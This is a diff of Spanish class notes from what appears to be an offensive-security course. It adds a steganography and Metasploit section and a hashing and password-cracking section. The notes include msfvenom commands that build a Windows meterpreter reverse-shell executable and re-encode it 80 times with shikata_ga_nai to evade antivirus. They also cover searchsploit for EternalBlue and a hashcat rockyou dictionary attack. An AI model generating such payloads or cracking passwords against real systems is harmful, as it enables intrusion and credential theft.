@@ -117,21 +117,123 @@ Continuacion maquina blue
 
 ## Clase del 14-11-2024
 
-Esteganografia online
+### Esteganografía y Generación de Payloads con Metasploit
 
-Explica el: msfvenom-p windows/meterpreter/reverse_tcp LHOST=(Your IP Address) LPORT=(Your Port) -f exe > reverse.exe
+#### **Esteganografía**
+- Uso de herramientas en línea para ocultar mensajes o archivos dentro de imágenes:
+  - [StegOnline](https://stegonline.georgeom.net/) para analizar y ocultar datos.
+  - **Recomendación**: Utilizar formatos como PNG o BMP para obtener mejores resultados.
 
-show encoders
+#### **Creación de Payloads con Metasploit**
+- Generación de payloads con `msfvenom` para conexiones reversas:
+  - Comando básico para generar un ejecutable malicioso:
+    ```bash
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port> -f exe > reverse.exe
+    ```
 
-Para encodear --> msfvenom-p windows/meterpreter/reverse_tcp LHOST=(Your IP Address) LPORT=(Your Port) -f exe -e (el encoder) x86/shikata_gnai -i 80> reverse.exe
+#### **Uso de Encoders**
+- Aplicación de técnicas para evadir antivirus:
+  - Comando para agregar un encoder:
+    ```bash
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port> -f exe -e x86/shikata_ga_nai -i 80 > reverse.exe
+    ```
+    - **`-e`**: Define el encoder (ejemplo: `x86/shikata_ga_nai`).
+    - **`-i`**: Número de iteraciones para reencodado (ejemplo: `80`).
 
--i para encodear lo encodeado, el numero lo disfraza 80 veces
+#### **Verificación del Payload**
+- Escaneo del archivo malicioso en **VirusTotal** para comprobar detección por antivirus.
+- Uso de `show encoders` en Metasploit para explorar opciones de codificación.
 
-virus total
-
-searchsploit para buscar sin conexion
+#### **Búsqueda de Vulnerabilidades Offline**
+- Uso de `searchsploit` para buscar exploits sin conexión:
+  ```bash
+  searchsploit eternalblue
 
 ![image](https://github.com/user-attachments/assets/076a4289-f5ed-45c4-9a74-3ace21938308)
 
 
+## Clase del 18-11-2024
+
+### Hashing y Cifrado: Conceptos y Diferencias
+
+- **Hashing**:
+  - Proceso unidireccional que convierte datos en una cadena de longitud fija.
+  - No se puede revertir al valor original.
+  - Usos comunes:
+    - Almacenamiento de contraseñas.
+    - Verificación de integridad de datos.
+  - Ejemplos de algoritmos:
+    - MD5, SHA-1, SHA-256.
+
+- **Cifrado**:
+  - Proceso bidireccional que transforma datos para proteger su confidencialidad.
+  - Requiere una clave para cifrar y otra (o la misma) para descifrar.
+  - Usos comunes:
+    - Protección de datos sensibles.
+    - Comunicaciones seguras.
+  - Ejemplos de algoritmos:
+    - AES, RSA, DES.
+
+- **Diferencias clave**:
+  | Aspecto          | Hashing              | Cifrado               |
+  |------------------|----------------------|-----------------------|
+  | Proceso          | Unidireccional       | Bidireccional         |
+  | Reversibilidad   | No reversible        | Reversible            |
+  | Propósito        | Verificación         | Confidencialidad      |
+  | Clave requerida  | No                   | Sí                    |
+
+---
+
+### Cracking de Contraseñas
+
+#### Métodos de Cracking
+1. **Fuerza Bruta**:
+   - Intenta todas las combinaciones posibles.
+   - Alto consumo de tiempo y recursos, pero garantiza éxito (si es posible).
+   - Ejemplo de herramienta: `John the Ripper`.
+
+2. **Ataque con Diccionarios**:
+   - Utiliza listas predefinidas de palabras o combinaciones comunes.
+   - Más rápido que fuerza bruta, pero limitado a las entradas del diccionario.
+   - Ejemplo de herramienta: `hashcat`.
+
+---
+
+### Tipos de Diccionarios y Fuentes
+
+- **Tipos de Diccionarios**:
+  - Contraseñas comunes: Listas de palabras y frases populares.
+  - Específicos de idioma: Adaptados a patrones lingüísticos.
+  - Temáticos: Palabras relacionadas con un tema específico (e.g., deportes, tecnología).
+
+- **Dónde encontrar diccionarios**:
+  1. **Kali Linux**:
+     - Carpetas preinstaladas:
+       ```bash
+       /usr/share/wordlists/
+       ```
+     - Ejemplo: `rockyou.txt`.
+  2. **Internet**:
+     - Repositorios públicos como GitHub.
+     - Sitios web especializados en ciberseguridad.
+  3. **Darknet**:
+     - Mercados y foros para diccionarios avanzados o personalizados.
+     - Precaución: Algunos pueden ser ilegales o maliciosos.
+
+> 💡 **Consejo:** Selecciona diccionarios basados en el contexto del ataque para maximizar las posibilidades de éxito.
+
+---
+
+### Herramientas Populares para Cracking
+- **John the Ripper**: Versátil y compatible con múltiples formatos de hash.
+- **Hashcat**: Potente y optimizado para GPUs.
+- **Hydra**: Especializado en ataques contra servicios como SSH, HTTP, etc.
+
+#### Ejemplo: Uso de Diccionario con Hashcat
+```bash
+hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+-m: Especifica el tipo de hash (e.g., 0 para MD5).
+-a: Modo de ataque (0 para diccionario).
+```
 
